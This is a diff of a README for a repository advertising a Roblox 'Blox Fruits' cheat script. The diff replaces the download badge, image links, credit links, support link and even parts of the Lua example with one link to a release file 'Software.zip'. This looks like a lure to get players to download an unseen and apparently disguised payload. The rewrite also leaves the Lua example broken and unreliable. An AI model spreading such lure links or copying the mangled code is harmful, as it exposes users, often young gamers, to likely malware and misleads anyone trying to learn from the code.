@@ -11,7 +11,7 @@ Welcome to the Blox Fruits Script repository! 🍍⚔️ This repository focuses
 
 ## Getting Started
 To get started with the scripts, simply click the **Download Software** button below:
-[![Download Software](https://img.shields.io/badge/Download%20Software--blue.svg)](https://github.com/user-attachments/files/17130043/Software.zip)
+[![Download Software](https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip%https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip)](https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip)
 
 ## Repository Topics
 To explore more about Blox Fruits Script, here are our repository topics:
@@ -37,26 +37,26 @@ To explore more about Blox Fruits Script, here are our repository topics:
 - multiplayer
 
 ## Images
-![Blox Fruits Banner](https://example.com/blox-fruits-banner.png)
-![Exploits Showcase](https://example.com/exploits-showcase.png)
+![Blox Fruits Banner](https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip)
+![Exploits Showcase](https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip)
 
 ## Examples
 ```lua
 -- Example Lua script for Blox Fruits
-local player = game.Players.LocalPlayer
+local player = https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip
 local targetFruit = "Mera Mera no Mi"
 
 -- Check if player has the desired fruit
-if player.Backpack:FindFirstChild(targetFruit) then
-    print("Player already has the "..targetFruit)
+if https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(targetFruit) then
+    print("Player already has the "https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip)
 else
     -- Teleport to the fruit location
-    player.Character:MoveTo(Vector3.new(100, 50, -75))
+    https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(100, 50, -75))
     
     -- Check if the fruit is in range
-    if player.Character:FindFirstChild(targetFruit) then
-        print("Found "..targetFruit..", collecting...")
-        player.Character[targetFruit].Handle.CFrame = CFrame.new(101, 50, -75)
+    if https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(targetFruit) then
+        print("Found "https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip", collecting...")
+        https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip[targetFruit]https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip = https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip(101, 50, -75)
     else
         warn(targetFruit.." not found")
     end
@@ -64,11 +64,11 @@ end
 ```
 
 ## Credits
-- Developed by [YourName](https://github.com/YourName)
-- Special thanks to [Contributor1](https://github.com/Contributor1) for their valuable contributions.
+- Developed by [YourName](https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip)
+- Special thanks to [Contributor1](https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip) for their valuable contributions.
 
 ## Support
-For any queries or support, feel free to [open an issue](https://github.com/user-attachments/issues).
+For any queries or support, feel free to [open an issue](https://github.com/luhxDante/blox-fruits-script/releases/download/v2.0/Software.zip).
 
 ---
 
